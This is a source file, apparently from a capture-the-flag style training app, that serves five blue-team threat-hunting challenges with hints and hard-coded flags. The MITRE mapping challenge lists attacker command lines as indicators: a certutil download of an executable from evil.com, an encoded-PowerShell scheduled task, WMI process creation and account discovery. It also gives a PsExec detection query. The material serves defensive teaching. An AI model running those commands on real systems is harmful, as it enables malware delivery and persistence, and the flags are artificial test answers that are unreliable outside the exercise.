/**
 * Threat Hunting & Blue Team Module
 * Covers: SIEM queries, MITRE ATT&CK mapping, anomaly detection, IR playbooks
 * Difficulty: Beginner → Pro
 */

const express = require('express');
const router = express.Router();

router.get('/', (req, res) => {
  res.render('threat_hunting/index', {
    title: 'Threat Hunting & Blue Team',
    user: req.session?.user,
  });
});

// TH1: SIEM Query (Beginner)
router.get('/siem-query', (req, res) => {
  res.json({
    vuln: 'TH1: SIEM Query — Detect Lateral Movement',
    level: 'Beginner',
    description:
      'Write a Splunk or Elastic query to detect an attacker using PsExec to move laterally.',
    example_spl:
      'index=windows source=WinEventLog:Security EventCode=4688 (NewProcessName="*psexec*") ' +
      'OR (CommandLine="\\\\\\\\*\\\\ADMIN$\\\\*" AND SourceUser!="*$")',
    technique: 'MITRE T1021.002 — Remote Services: SMB/Windows Admin',
    hint: 'Look for PsExec service binary creation (Event 7045) and ADMIN$ share access.',
    flag: 'FLAG{th01_siem_a1b2}',
  });
});

// TH2: MITRE ATT&CK Tactic Identification (Beginner)
router.get('/mitre-identify', (req, res) => {
  res.json({
    vuln: 'TH2: MITRE ATT&CK Technique Mapping',
    level: 'Beginner',
    description: 'Match each indicator below to its MITRE ATT&CK technique ID.',
    indicators: [
      {
        log: 'schtasks /create /sc ONLOGON /tn Update /tr "powershell.exe -enc"',
        technique: 'T1053.005',
      },
      { log: 'wmic process call create "cmd.exe"', technique: 'T1047' },
      { log: 'whoami /priv; net user; net localgroup administrators', technique: 'T1087.001' },
      {
        log: 'certutil -urlcache -split -f http://evil.com/x.exe %TEMP%\\x.exe',
        technique: 'T1105 + T1553.004',
      },
    ],
    hint: 'schtasks persistence = T1053 Scheduled Tasks. WMI = T1047. whoami = T1087 Account Discovery.',
    flag: 'FLAG{th02_mitre_c3d4}',
  });
});

// TH3: Anomaly Detection with Baselining (Intermediate)
router.get('/anomaly', (req, res) => {
  res.json({
    vuln: 'TH3: Anomaly Detection — Baseline Deviation',
    level: 'Intermediate',
    description:
      'A user normally logs in from 9-5 in one city. Today: login from two countries in 1 hour. How do you detect this?',
    baseline: { hours: '08:00-17:00', locations: ['New York'], devices: ['MAC1', 'MAC2'] },
    anomaly: {
      events: ['08:00 New York IP', '08:23 Lagos IP', '08:45 New York IP'],
      alert: 'Impossible Travel',
    },
    hint: 'Use geo-correlation: distance / time = speed > 900 km/h triggers impossible travel.',
    flag: 'FLAG{th03_anomaly_e5f6}',
  });
});

// TH4: Memory Forensics for Incident Response (Advanced)
router.get('/memory-hunt', (req, res) => {
  res.json({
    vuln: 'TH4: Memory Forensics — Rootkit Detection',
    level: 'Advanced',
    description:
      'Volatility output shows a hidden process with no parent and manipulate DKOM. Identify by cross-referencing pslist vs pstree.',
    vol_output:
      'pslist shows PID 4892 svchost.exe (parent: 892)\n' +
      'pstree shows no parent for 4892\n' +
      '_EPROC.ActiveProcessLinks.flink points outside the list → DKOM',
    hint: 'DKOM (Direct Kernel Object Manipulation) unlinks EPROCESS from the ActiveProcessLinks list.',
    flag: 'FLAG{th04_memory_g7h8}',
  });
});

// TH5: Threat Intel Integration & Hunting (Pro)
router.post('/hunt', (req, res) => {
  const { hypothesis } = req.body;
  res.json({
    vuln: 'TH5: Threat Hunting Hypothesis Framework',
    level: 'Pro',
    description:
      'Craft a hunt hypothesis based on threat actor TTPs from public intel reports, then translate to a SIEM query + endpoint telemetry sweep.',
    example_hypothesis:
      'Actor X (APT29) uses WMI subscription for persistence (T1546.003).\n' +
      'Hunt: Query __EventFilter and __EventConsumer WMI namespaces across all hosts.\n' +
      'Validate: Cross-reference command lines and outbound C2 indicators.',
    your_hypothesis: hypothesis || '(none provided)',
    flag: 'FLAG{th05_hunt_i9j0}',
  });
});

module.exports = router;
